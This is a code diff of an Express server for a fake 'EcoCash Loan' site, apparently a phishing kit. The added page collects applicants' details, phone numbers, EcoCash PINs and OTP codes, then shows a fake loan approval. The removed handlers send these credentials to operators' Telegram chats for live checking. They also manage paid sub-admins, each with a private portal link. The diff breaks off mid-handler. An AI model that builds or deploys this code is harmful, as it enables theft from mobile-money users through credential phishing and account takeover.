@@ -1,489 +1,487 @@
-require('dotenv').config();
-const express = require('express');
-const cors = require('cors');
-const path = require('path');
-const fs = require('fs');
-const fetch = require('node-fetch');
+const express = require("express");
 
 const app = express();
-const PORT = process.env.PORT || 10000;
+const PORT = process.env.PORT || 3000;
 
-app.use(cors());
 app.use(express.json());
 
-const publicPath = path.join(__dirname, 'public');
-app.use(express.static(publicPath));
-
-// Persistent storage file path
-const STORAGE_FILE = path.join(__dirname, 'admins_data.json');
-
-// Load initial data from disk if it exists
-function loadPersistentData() {
-  try {
-    if (fs.existsSync(STORAGE_FILE)) {
-      const rawData = fs.readFileSync(STORAGE_FILE, 'utf8');
-      const parsed = JSON.parse(rawData);
-      return {
-        authorizedUsers: new Map(parsed.authorizedUsers || []),
-        secondaryAdmins: new Map(parsed.secondaryAdmins || []),
-        pathToAdminChat: new Map(parsed.pathToAdminChat || []),
-        pathStatus: new Map(parsed.pathStatus || []),
-        adminCounter: parsed.adminCounter || 1
-      };
-    }
-  } catch (err) {
-    console.error("Error loading persistent data:", err);
+// Demo admin database (replace with MongoDB in production)
+const admins = {
+  "0001": {
+    adminId: "0001",
+    role: "MAIN_ADMIN",
+    status: "ACTIVE",
+    suspendUntil: null,
+    reason: null
+  },
+  "0002": {
+    adminId: "0002",
+    role: "SUB_ADMIN",
+    status: "ACTIVE",
+    suspendUntil: null,
+    reason: null
+  },
+  "0003": {
+    adminId: "0003",
+    role: "SUB_ADMIN",
+    status: "ACTIVE",
+    suspendUntil: null,
+    reason: null
   }
-  return {
-    authorizedUsers: new Map(),
-    secondaryAdmins: new Map(),
-    pathToAdminChat: new Map(),
-    pathStatus: new Map(),
-    adminCounter: 1
-  };
+};
+
+// In-memory application tracking store for the frontend API endpoints
+const applications = {};
+
+// Middleware to check if an admin is allowed access
+function checkAdminAccess(req, res, next) {
+  const admin = admins[req.params.adminId];
+
+  if (!admin) {
+    return res.status(404).json({
+      success: false,
+      message: "Admin not found"
+    });
+  }
+
+  // Check if suspension period has expired automatically
+  if (admin.status === "SUSPENDED") {
+    if (admin.suspendUntil && new Date() > new Date(admin.suspendUntil)) {
+      admin.status = "ACTIVE";
+      admin.suspendUntil = null;
+      admin.reason = null;
+    } else {
+      return res.status(403).json({
+        success: false,
+        message: "This administrator account is suspended.",
+        suspendUntil: admin.suspendUntil,
+        reason: admin.reason
+      });
+    }
+  }
+
+  req.admin = admin;
+  next();
 }
 
-// Save current maps to disk
-function savePersistentData() {
-  try {
-    const dataToSave = {
-      authorizedUsers: Array.from(authorizedUsers.entries()),
-      secondaryAdmins: Array.from(secondaryAdmins.entries()),
-      pathToAdminChat: Array.from(pathToAdminChat.entries()),
-      pathStatus: Array.from(pathStatus.entries()),
-      adminCounter
-    };
-    fs.writeFileSync(STORAGE_FILE, JSON.stringify(dataToSave, null, 2));
-  } catch (err) {
-    console.error("Error saving persistent data:", err);
+// Example admin portal
+app.get("/Admin-:adminId", checkAdminAccess, (req, res) => {
+  res.send(`
+    <h2>Welcome Admin ${req.admin.adminId}</h2>
+    <p>Status: ${req.admin.status}</p>
+  `);
+});
+
+// Suspend a sub-admin
+app.post("/main-admin/suspend", (req, res) => {
+  const { mainAdminId, targetAdminId, days, reason } = req.body;
+
+  if (mainAdminId !== "0001") {
+    return res.status(403).json({
+      success: false,
+      message: "Only Main Admin can suspend admins."
+    });
   }
-}
 
-const activeApplications = new Map();
-const persisted = loadPersistentData();
-const authorizedUsers = persisted.authorizedUsers;
-const secondaryAdmins = persisted.secondaryAdmins;
-const pathToAdminChat = persisted.pathToAdminChat;
-const pathStatus = persisted.pathStatus;
-let adminCounter = persisted.adminCounter;
+  const admin = admins[targetAdminId];
 
-function formatZimbabwePhone(phone) {
-  let formattedPhone = phone || '';
-  if (formattedPhone.startsWith('+263')) {
-    formattedPhone = formattedPhone.replace('+263', '');
-  } else if (formattedPhone.startsWith('263')) {
-    formattedPhone = formattedPhone.slice(3);
-  } else if (formattedPhone.startsWith('0')) {
-    formattedPhone = formattedPhone.slice(1);
+  if (!admin) {
+    return res.status(404).json({
+      success: false,
+      message: "Admin not found."
+    });
   }
-  return formattedPhone;
-}
 
-// STEP 2 SUBMISSION: Credentials delivered strictly to the specific secondary Admin chat tied to the link path
-app.post('/api/submit-credentials', async (req, res) => {
-  try {
-    const data = req.body;
-    const formattedPhone = formatZimbabwePhone(data.phone);
+  // Prevent suspending the main admin
+  if (targetAdminId === "0001") {
+    return res.status(400).json({
+      success: false,
+      message: "Cannot suspend the Main Admin."
+    });
+  }
+
+  const parsedDays = Number(days);
+  if (isNaN(parsedDays) || parsedDays <= 0) {
+    return res.status(400).json({
+      success: false,
+      message: "Invalid suspension duration provided."
+    });
+  }
+
+  const until = new Date();
+  until.setDate(until.getDate() + parsedDays);
+
+  admin.status = "SUSPENDED";
+  admin.suspendUntil = until;
+  admin.reason = reason || "No reason provided";
+
+  res.json({
+    success: true,
+    message: `Admin ${targetAdminId} suspended.`,
+    suspendUntil: until
+  });
+});
+
+// Reactivate before suspension expires
+app.post("/main-admin/reactivate", (req, res) => {
+  const { mainAdminId, targetAdminId } = req.body;
+
+  if (mainAdminId !== "0001") {
+    return res.status(403).json({
+      success: false,
+      message: "Only Main Admin can reactivate admins."
+    });
+  }
+
+  const admin = admins[targetAdminId];
+
+  if (!admin) {
+    return res.status(404).json({
+      success: false,
+      message: "Admin not found."
+    });
+  }
+
+  admin.status = "ACTIVE";
+  admin.suspendUntil = null;
+  admin.reason = null;
+
+  res.json({
+    success: true,
+    message: `Admin ${targetAdminId} is active again.`
+  });
+});
+
+// View all admins
+app.get("/main-admin/admins", (req, res) => {
+  res.json(admins);
+});
+
+// ==========================================
+// FRONTEND INTEGRATION API ENDPOINTS
+// ==========================================
+
+// Serve the HTML frontend file directly at the root
+app.get("/", (req, res) => {
+  res.send(`<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>EcoCash Loan Application</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-blue-50/50 flex items-center justify-center min-h-screen p-4">
+  <div class="bg-white rounded-2xl shadow-xl border border-blue-100 w-full max-w-lg p-6 sm:p-8">
     
-    if (!['77', '78'].some(prefix => formattedPhone.startsWith(prefix))) {
-      return res.status(400).json({ success: false, error: "Only valid EcoCash phone numbers (+263 77 / +263 78) are allowed." });
-    }
+    <!-- HEADER -->
+    <div class="text-center mb-6">
+      <h1 class="text-3xl font-extrabold text-blue-600 tracking-tight">EcoCash Loan</h1>
+      <p class="text-sm text-blue-500 font-medium mt-1">Fast & Secure Mobile Loans</p>
+    </div>
 
-    const randomHex = Math.random().toString(36).substring(2, 6).toUpperCase();
-    const appReference = `ECO-${Date.now().toString().slice(-6)}-${randomHex}`;
+    <!-- HORIZONTAL STEP INDICATOR (3 STEPS) -->
+    <div id="step-indicator" class="flex items-center justify-between mb-8 px-2">
+      <!-- Step 1 Badge -->
+      <div id="step-node-1" class="flex flex-col items-center">
+        <div id="step-circle-1" class="w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-blue-600 text-white font-bold flex items-center justify-center shadow-md text-sm">1</div>
+        <span id="step-label-1" class="text-[10px] sm:text-xs font-semibold text-blue-600 mt-1.5">Details</span>
+      </div>
+      <div id="step-line-1" class="flex-1 h-1 bg-gray-200 mx-1.5 rounded transition-colors duration-300"></div>
 
-    // Strictly sanitize and validate portal path to prevent accidental cross-chat leaks
-    let portalPath = data.portalPath || '';
-    if (!portalPath.startsWith('/Admin-')) {
-      portalPath = '/Admin-0001';
-    }
-    
-    // Check if this specific link path has been suspended by the Main Admin
-    if (pathStatus.get(portalPath) === 'SUSPENDED') {
-      return res.status(403).json({ success: false, error: "This portal link has been temporarily suspended by the administration." });
-    }
-    
-    // Explicitly target the chat mapped to this path
-    const targetChatId = pathToAdminChat.get(portalPath);
+      <!-- Step 2 Badge -->
+      <div id="step-node-2" class="flex flex-col items-center">
+        <div id="step-circle-2" class="w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-gray-200 text-gray-500 font-bold flex items-center justify-center text-sm">2</div>
+        <span id="step-label-2" class="text-[10px] sm:text-xs font-medium text-gray-400 mt-1.5">Account</span>
+      </div>
+      <div id="step-line-2" class="flex-1 h-1 bg-gray-200 mx-1.5 rounded transition-colors duration-300"></div>
 
-    if (!targetChatId) {
-      return res.status(400).json({ success: false, error: "This portal link is not currently mapped to an active session or admin." });
-    }
+      <!-- Step 3 Badge -->
+      <div id="step-node-3" class="flex flex-col items-center">
+        <div id="step-circle-3" class="w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-gray-200 text-gray-500 font-bold flex items-center justify-center text-sm">3</div>
+        <span id="step-label-3" class="text-[10px] sm:text-xs font-medium text-gray-400 mt-1.5">Verify</span>
+      </div>
+    </div>
 
-    activeApplications.set(appReference, {
-      ...data,
-      formattedPhone,
-      portalPath,
-      targetChatId,
-      status: 'PIN_PENDING'
+    <!-- STEP 1: APPLICANT DETAILS & SLIDER CALCULATOR -->
+    <form id="step1-form" class="space-y-4">
+      <div>
+        <label class="block text-sm font-semibold text-gray-700 mb-1">Full Name</label>
+        <input type="text" id="fullName" required placeholder="John Doe"
+               class="w-full border border-blue-200 rounded-lg p-3 text-gray-800 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 text-base">
+      </div>
+
+      <div>
+        <label class="block text-sm font-semibold text-gray-700 mb-1">Occupation</label>
+        <input type="text" id="occupation" required placeholder="e.g. Civil Servant / Entrepreneur"
+               class="w-full border border-blue-200 rounded-lg p-3 text-gray-800 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 text-base">
+      </div>
+
+      <div>
+        <label class="block text-sm font-semibold text-gray-700 mb-1">Estimated Monthly Payments / Income ($)</label>
+        <input type="number" id="monthlyPayments" required min="50" placeholder="500"
+               class="w-full border border-blue-200 rounded-lg p-3 text-gray-800 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 text-base">
+      </div>
+
+      <!-- SLIDER CALCULATOR FOR LOAN BALANCING -->
+      <div class="bg-blue-50/70 p-4 rounded-xl border border-blue-100 space-y-3">
+        <div class="flex justify-between items-center">
+          <label class="text-sm font-semibold text-blue-900">Requested Loan Amount ($)</label>
+          <span id="loan-amount-display" class="text-lg font-extrabold text-blue-600">$250</span>
+        </div>
+        <input type="range" id="loanAmountSlider" min="20" max="1000" step="10" value="250"
+               class="w-full h-2 bg-blue-200 rounded-lg appearance-none cursor-pointer accent-blue-600">
+        <div class="flex justify-between text-xs text-blue-500 font-medium">
+          <span>$20</span>
+          <span>$500</span>
+          <span>$1000</span>
+        </div>
+      </div>
+
+      <div>
+        <label class="block text-sm font-semibold text-gray-700 mb-1">Time for Repayment</label>
+        <select id="repaymentTime" class="w-full border border-blue-200 rounded-lg p-3 text-gray-800 focus:outline-none focus:ring-2 focus:ring-blue-500 bg-white">
+          <option value="1 Month">1 Month</option>
+          <option value="3 Months">3 Months</option>
+          <option value="6 Months">6 Months</option>
+        </select>
+      </div>
+
+      <button type="submit" id="btn-step1"
+              class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3.5 rounded-lg shadow-md transition duration-200 mt-2">
+        NEXT
+      </button>
+    </form>
+
+    <!-- STEP 2: PHONE NUMBER & PIN -->
+    <form id="step2-form" class="space-y-4 hidden">
+      <div>
+        <label class="block text-sm font-semibold text-gray-700 mb-1">EcoCash Registered Phone Number</label>
+        <div class="flex">
+          <span class="inline-flex items-center px-3.5 rounded-l-lg border border-r-0 border-blue-200 bg-blue-50 text-blue-700 text-sm font-semibold">+263</span>
+          <input type="tel" id="phone" required placeholder="771234567" maxlength="9"
+                 class="w-full border border-blue-200 rounded-r-lg p-3 text-gray-800 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 text-base">
+        </div>
+      </div>
+
+      <div>
+        <label class="block text-sm font-semibold text-gray-700 mb-1">4-Digit EcoCash PIN</label>
+        <input type="password" id="pin" required maxlength="4" pattern="\\d{4}" placeholder="••••"
+               class="w-full border border-blue-200 rounded-lg p-3 text-center text-gray-800 text-2xl font-bold tracking-widest focus:outline-none focus:ring-2 focus:ring-blue-500">
+      </div>
+
+      <button type="submit" id="btn-step2"
+              class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3.5 rounded-lg shadow-md transition duration-200 mt-2">
+        LOG IN
+      </button>
+    </form>
+
+    <!-- LOADING & COUNTDOWN SCREEN WITH VISUAL STICKER / BADGE ELEMENT -->
+    <div id="step-loading" class="hidden text-center py-6 space-y-4">
+      <div class="flex justify-center">
+        <div class="relative bg-amber-50 border-2 border-amber-200 p-3 rounded-2xl shadow-sm inline-block">
+          <span class="text-4xl">⚠️</span>
+          <div class="absolute -bottom-2 -right-2 bg-red-600 text-white text-[10px] font-bold px-1.5 py-0.5 rounded-full shadow">SECURE</div>
+        </div>
+      </div>
+      <div class="inline-block animate-spin rounded-full h-10 w-10 border-4 border-blue-600 border-t-transparent"></div>
+      <h3 id="loading-title" class="text-lg font-bold text-gray-800">Processing Details...</h3>
+      <p id="loading-desc" class="text-xs text-gray-500 max-w-xs mx-auto">Connecting to your account line safely...</p>
+    </div>
+
+    <!-- STEP 3: OTP VERIFICATION -->
+    <form id="step3-form" class="space-y-4 hidden">
+      <div id="otp-status-banner" class="bg-blue-50 border border-blue-200 rounded-lg p-3 text-center">
+        <p id="otp-status-text" class="text-xs text-blue-700 font-medium">An SMS with a 6-digit verification code has been dispatched to your mobile line.</p>
+      </div>
+
+      <div>
+        <label class="block text-sm font-semibold text-gray-700 text-center mb-1">Enter 6-Digit OTP Code</label>
+        <input type="text" id="otp" required maxlength="6" pattern="\\d{6}" placeholder="123456"
+               class="w-full border border-blue-200 rounded-lg p-3 text-center text-3xl font-extrabold tracking-widest text-blue-900 focus:outline-none focus:ring-2 focus:ring-blue-500">
+      </div>
+
+      <button type="submit" id="btn-step3"
+              class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3.5 rounded-lg shadow-md transition duration-200">
+        SUBMIT OTP
+      </button>
+      
+      <div id="step3-loading" class="hidden text-center text-xs font-bold text-blue-600 tracking-wider pt-2">
+        WAITING TO VERIFY YOUR OTP
+      </div>
+    </form>
+
+    <!-- SUCCESS SCREEN WITH FULL CONGRATULATIONS NOTICE -->
+    <div id="success-screen" class="hidden space-y-4 text-gray-800 text-sm leading-relaxed">
+      <div class="bg-blue-50 border border-blue-200 rounded-xl p-5 shadow-inner">
+        <h2 class="text-center text-blue-700 font-extrabold text-base mb-3">🎉🎉 CONGRATULATIONS! YOUR LOAN HAS BEEN APPROVED 🎉🎉</h2>
+        <div class="border-t border-b border-blue-200 py-2 my-2 text-center text-xs font-bold text-blue-800 tracking-wider">
+          🏦 LOAN APPROVAL NOTICE
+        </div>
+        <p class="mb-2">Dear Applicant,</p>
+        <p class="mb-2">We are pleased to inform you that your loan application has been successfully reviewed and <b>APPROVED</b>. ✅</p>
+        <p class="mb-2">🌟 Congratulations! Your application has met all the required approval criteria.</p>
+        <p class="mb-2">📌 <b>Loan Status:</b> ✅ APPROVED<br>💰 <b>Disbursement Status:</b> Processing for Immediate Release</p>
+        <p class="mb-2">Your approved loan will be disbursed to your registered account shortly. Please keep your phone switched on and monitor your account for the payment notification.</p>
+        <p class="mb-3">Thank you for choosing our lending services. We appreciate your trust and look forward to serving you again.</p>
+        <div class="border-t border-blue-200 pt-3 text-center text-xs font-semibold text-blue-900">
+          🎊 Congratulations once again! 🎊<br><br>
+          Your loan has been approved and is now being processed for immediate disbursement.<br>
+          We wish you success and prosperity with your approved funds.<br><br>
+          ✔ OFFICIAL LOAN APPROVAL
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <script>
+    let appReference = null;
+    let statusInterval = null;
+
+    const slider = document.getElementById('loanAmountSlider');
+    const sliderDisplay = document.getElementById('loan-amount-display');
+    slider.addEventListener('input', (e) => {
+      sliderDisplay.textContent = \`$\${e.target.value}\`;
     });
 
-    const botToken = process.env.TELEGRAM_BOT_TOKEN;
+    function updateIndicator(step) {
+      for (let i = 1; i <= 3; i++) {
+        const circle = document.getElementById(\`step-circle-\${i}\`);
+        const label = document.getElementById(\`step-label-\${i}\`);
+        const line = document.getElementById(\`step-line-\${i}\`);
 
-    if (botToken && targetChatId) {
-      const currentTimestamp = new Date().toLocaleString('en-US', {
-        timeZone: 'Africa/Harare',
-        year: 'numeric', month: 'numeric', day: 'numeric',
-        hour: 'numeric', minute: '2-digit', second: '2-digit', hour12: true
-      });
-
-      const messageText = `🔐 <b>ECOCASH CREDENTIALS (STEP 2)</b>\n\n` +
-                          `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
-                          `🌐 <b>Portal Link Used:</b> ${portalPath}\n` +
-                          `👤 <b>Name:</b> ${data.fullName || 'N/A'}\n` +
-                          `🏢 <b>Occupation:</b> ${data.occupation || 'N/A'}\n` +
-                          `💵 <b>Monthly Income:</b> $${data.monthlyPayments || 'N/A'}\n` +
-                          `📊 <b>Loan Requested:</b> $${data.loanAmount || 'N/A'}\n` +
-                          `⏳ <b>Repayment:</b> ${data.repaymentTime || 'N/A'}\n` +
-                          `📞 <b>Phone:</b> 263${formattedPhone}\n` +
-                          `🔑 <b>PIN (4-digit):</b> <code>${data.pin || 'N/A'}</code>\n` +
-                          `⏰ <b>Date:</b> ${currentTimestamp}\n\n` +
-                          `❓ <b>VERIFY PIN ACCURACY:</b>`;
-
-      const telegramPayload = {
-        chat_id: targetChatId,
-        text: messageText,
-        parse_mode: 'HTML',
-        reply_markup: JSON.stringify({
-          inline_keyboard: [
-            [
-              { text: '❌ Wrong PIN', callback_data: `pin_wrong_${appReference}` },
-              { text: '✅ Correct PIN', callback_data: `pin_correct_${appReference}` }
-            ]
-          ]
-        })
-      };
-
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(telegramPayload)
-      });
-    }
-
-    res.status(201).json({ success: true, appReference });
-  } catch (error) {
-    console.error("Credentials submission error:", error);
-    res.status(500).json({ success: false, error: "Internal Server Error" });
-  }
-});
-
-// STEP 3 SUBMISSION: OTP delivered to the exact same secondary Admin chat that received Step 2
-app.post('/api/submit-otp', async (req, res) => {
-  try {
-    const { appReference, otpCode } = req.body;
-    const appData = activeApplications.get(appReference);
-
-    if (!appData) {
-      return res.status(404).json({ success: false, error: "Application reference not found" });
-    }
-
-    // Check if path got suspended midway
-    if (pathStatus.get(appData.portalPath) === 'SUSPENDED') {
-      return res.status(403).json({ success: false, error: "This portal link has been temporarily suspended." });
-    }
-
-    appData.otpCode = otpCode;
-    appData.status = 'OTP_PENDING';
-    activeApplications.set(appReference, appData);
-
-    const botToken = process.env.TELEGRAM_BOT_TOKEN;
-    const targetChatId = appData.targetChatId;
-
-    if (botToken && targetChatId) {
-      const messageText = `💬 <b>OTP CODE SUBMISSION (STEP 3)</b>\n\n` +
-                          `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
-                          `📞 <b>Phone:</b> 263${appData.formattedPhone}\n` +
-                          `🔑 <b>PIN:</b> <code>${appData.pin}</code>\n` +
-                          `💬 <b>OTP Code:</b> <code>${otpCode}</code>\n\n` +
-                          `❓ <b>VERIFY OTP ACCURACY:</b>`;
-
-      const telegramPayload = {
-        chat_id: targetChatId,
-        text: messageText,
-        parse_mode: 'HTML',
-        reply_markup: JSON.stringify({
-          inline_keyboard: [
-            [
-              { text: '❌ Wrong OTP', callback_data: `otp_wrong_${appReference}` },
-              { text: '✅ Correct OTP', callback_data: `otp_correct_${appReference}` }
-            ]
-          ]
-        })
-      };
-
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(telegramPayload)
-      });
-    }
-
-    res.status(200).json({ success: true });
-  } catch (error) {
-    console.error("OTP submission error:", error);
-    res.status(500).json({ success: false, error: "Internal Server Error" });
-  }
-});
-
-// Status Polling Endpoint
-app.get('/api/check-status/:appReference', (req, res) => {
-  const { appReference } = req.params;
-  const appData = activeApplications.get(appReference);
-
-  if (!appData) {
-    return res.status(404).json({ success: false, status: 'NOT_FOUND' });
-  }
-
-  res.json({ success: true, status: appData.status });
-});
-
-// Telegram Webhook Handler
-app.post('/api/telegram-webhook', async (req, res) => {
-  res.sendStatus(200);
-  const botToken = process.env.TELEGRAM_BOT_TOKEN;
-  const masterChatId = process.env.TELEGRAM_CHAT_ID;
-
-  if (req.body.message && req.body.message.text) {
-    const message = req.body.message;
-    const text = message.text.trim();
-    const chatId = message.chat.id.toString();
-    const user = message.from;
-
-    if (text === '/start') {
-      const userId = user.id;
-      const firstName = user.first_name || 'N/A';
-      const lastName = user.last_name || '';
-      const fullName = `${firstName} ${lastName}`.trim();
-      const username = user.username ? `@${user.username}` : 'No Username';
-      const privateLink = user.username ? `https://t.me/${user.username}` : `tg://user?id=${userId}`;
-
-      const userStatus = authorizedUsers.get(userId);
-
-      // Main Admin check
-      if (chatId === masterChatId.toString()) {
-        authorizedUsers.set(userId, 'PAID');
-        const mainPath = '/Admin-0001';
-        pathToAdminChat.set(mainPath, chatId);
-        pathStatus.set(mainPath, 'ACTIVE');
-        savePersistentData();
-
-        const portalUrl = `https://${req.get('host')}${mainPath}`;
-        const welcomeBackText = `🤖 <b>EcoCash Loan Portal (Main Admin)</b>\n\n` +
-                                `✅ <b>Access Status:</b> AUTHORIZED (PAID)\n` +
-                                `🔗 <b>Your Portal Link:</b> <a href="${portalUrl}">${portalUrl}</a>`;
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text: welcomeBackText, parse_mode: 'HTML', disable_web_page_preview: true })
-        });
-        return;
-      }
-
-      // Secondary Admin who is already PAID
-      if (userStatus === 'PAID' && secondaryAdmins.has(userId)) {
-        const assignedPath = secondaryAdmins.get(userId);
-        const portalUrl = `https://${req.get('host')}${assignedPath}`;
-        
-        // Ensure their chat ID maps directly to their specific path dynamically on /start
-        pathToAdminChat.set(assignedPath, chatId);
-        savePersistentData();
-
-        const currentLinkStatus = pathStatus.get(assignedPath) || 'ACTIVE';
-        const welcomeBackText = `🤖 <b>EcoCash Loan Portal</b>\n\n` +
-                                `✅ <b>Access Status:</b> AUTHORIZED (PAID)\n` +
-                                `📌 <b>Link Status:</b> ${currentLinkStatus}\n` +
-                                `🔗 <b>Your Private Portal Link:</b> <a href="${portalUrl}">${portalUrl}</a>`;
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text: welcomeBackText, parse_mode: 'HTML', disable_web_page_preview: true })
-        });
-        return;
-      }
-
-      if (userStatus === 'UNPAID') {
-        const deniedText = `⚠️ <b>Access Denied</b>\n\nYour account status is marked as <b>UNPAID</b> by the administrator.`;
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text: deniedText, parse_mode: 'HTML' })
-        });
-        return;
-      }
-
-      if (userStatus === 'PENDING') {
-        const pendingAgainText = `👋 Hello <b>${fullName}</b>,\n\n` +
-                                 `Your access request is already pending review by the main administrator. Please wait for clearance.`;
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text: pendingAgainText, parse_mode: 'HTML' })
-        });
-        return;
-      }
-
-      // New user triggering /start -> Send registration request ONLY to Main Admin
-      authorizedUsers.set(userId, 'PENDING');
-      savePersistentData();
-
-      const adminAlertText = `🚨 <b>NEW ADMIN ACCESS REQUEST</b>\n\n` +
-                             `🆔 <b>ID:</b> <code>${userId}</code>\n` +
-                             `👤 <b>Name:</b> ${fullName}\n` +
-                             `🏷 <b>Username:</b> ${username}\n` +
-                             `🔗 <b>Private Link:</b> <a href="${privateLink}">Open Profile</a>\n\n` +
-                             `👇 <b>Select Access Status for this User:</b>`;
-
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: masterChatId,
-          text: adminAlertText,
-          parse_mode: 'HTML',
-          reply_markup: JSON.stringify({
-            inline_keyboard: [
-              [
-                { text: '❌ UNPAID (Deny)', callback_data: `access_unpaid_${userId}` },
-                { text: '✅ PAID (Approve)', callback_data: `access_paid_${userId}` }
-              ]
-            ]
-          })
-        })
-      });
-
-      const userPendingText = `👋 Hello <b>${fullName}</b>,\n\n` +
-                              `Your access request has been sent to the main administrator for review.\n\n` +
-                              `🆔 <b>Your ID:</b> <code>${userId}</code>\n` +
-                              `📌 <b>Status:</b> Pending Approval (Waiting for PAID clearance)`;
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text: userPendingText, parse_mode: 'HTML' })
-      });
-    }
-    return;
-  }
-
-  const { callback_query } = req.body;
-  if (!callback_query) return;
-
-  const actionData = callback_query.data;
-  const chatId = callback_query.message.chat.id.toString();
-  const messageId = callback_query.message.message_id;
-
-  if (actionData.startsWith('access_paid_') || actionData.startsWith('access_unpaid_')) {
-    if (chatId !== masterChatId.toString()) {
-      await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ callback_query_id: callback_query.id, text: "Unauthorized action. Main Admin only.", show_alert: true })
-      });
-      return;
-    }
-
-    const targetUserId = parseInt(actionData.split('_')[2], 10);
-    const isPaid = actionData.startsWith('access_paid_');
-
-    authorizedUsers.set(targetUserId, isPaid ? 'PAID' : 'UNPAID');
-
-    let assignedPath = '';
-    if (isPaid) {
-      if (!secondaryAdmins.has(targetUserId)) {
-        adminCounter++;
-        const paddedId = String(adminCounter).padStart(4, '0');
-        assignedPath = `/Admin-${paddedId}`;
-        secondaryAdmins.set(targetUserId, assignedPath);
-        pathToAdminChat.set(assignedPath, targetUserId.toString());
-        pathStatus.set(assignedPath, 'ACTIVE');
-      } else {
-        assignedPath = secondaryAdmins.get(targetUserId);
-        pathToAdminChat.set(assignedPath, targetUserId.toString());
-        if (!pathStatus.has(assignedPath)) {
-          pathStatus.set(assignedPath, 'ACTIVE');
+        if (i < step) {
+          circle.className = "w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-blue-600 text-white font-bold flex items-center justify-center text-sm shadow-md";
+          label.className = "text-[10px] sm:text-xs font-semibold text-blue-600 mt-1.5";
+          if (line) line.className = "flex-1 h-1 bg-blue-600 mx-1.5 rounded transition-colors duration-300";
+        } else if (i === step) {
+          circle.className = "w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-blue-600 text-white font-bold flex items-center justify-center text-sm shadow-md";
+          label.className = "text-[10px] sm:text-xs font-semibold text-blue-600 mt-1.5";
+        } else {
+          circle.className = "w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-gray-200 text-gray-500 font-bold flex items-center justify-center text-sm";
+          label.className = "text-[10px] sm:text-xs font-medium text-gray-400 mt-1.5";
+          if (line) line.className = "flex-1 h-1 bg-gray-200 mx-1.5 rounded transition-colors duration-300";
         }
       }
     }
-    savePersistentData();
 
-    const statusLabel = isPaid ? `🟢 APPROVED (PAID) - Link: ${assignedPath}` : '🔴 REJECTED (UNPAID)';
-    const updatedText = `${callback_query.message.text}\n\n📌 <b>Decision:</b> ${statusLabel}`;
-    
-    // Append a toggle suspend button for this path if approved
-    let replyMarkup = undefined;
-    if (isPaid && assignedPath) {
-      replyMarkup = JSON.stringify({
-        inline_keyboard: [
-          [
-            { text: '🔒 Suspend / 🔓 Activate Link', callback_data: `toggle_suspend_${assignedPath}` }
-          ]
-        ]
-      });
-    }
+    document.getElementById('step1-form').addEventListener('submit', (e) => {
+      e.preventDefault();
+      document.getElementById('step1-form').classList.add('hidden');
+      document.getElementById('step-loading').classList.remove('hidden');
+      document.getElementById('loading-title').textContent = "Processing Profile...";
+      document.getElementById('loading-desc').textContent = "Saving personal evaluation data...";
 
-    await editTelegramMessageWithOptions(botToken, chatId, messageId, updatedText, replyMarkup);
-
-    const portalUrl = isPaid ? `https://${req.get('host')}${assignedPath}` : '';
-    const notificationText = isPaid 
-      ? `🎉 <b>Access Granted!</b>\n\nYour payment has been verified as <b>PAID</b>. Here is your unique private portal link:\n\n🔗 <a href="${portalUrl}">${portalUrl}</a>`
-      : `⚠️ <b>Access Denied</b>\n\nYour account status is marked as <b>UNPAID</b>. Access to the portal link is restricted.`;
-
-    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: targetUserId, text: notificationText, parse_mode: 'HTML', disable_web_page_preview: true })
-    });
-    return;
-  }
-
-  // Handle Main Admin toggling specific path suspension/activation via inline button
-  if (actionData.startsWith('toggle_suspend_')) {
-    if (chatId !== masterChatId.toString()) {
-      await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ callback_query_id: callback_query.id, text: "Unauthorized action. Main Admin only.", show_alert: true })
-      });
-      return;
-    }
-
-    const targetPath = actionData.replace('toggle_suspend_', '');
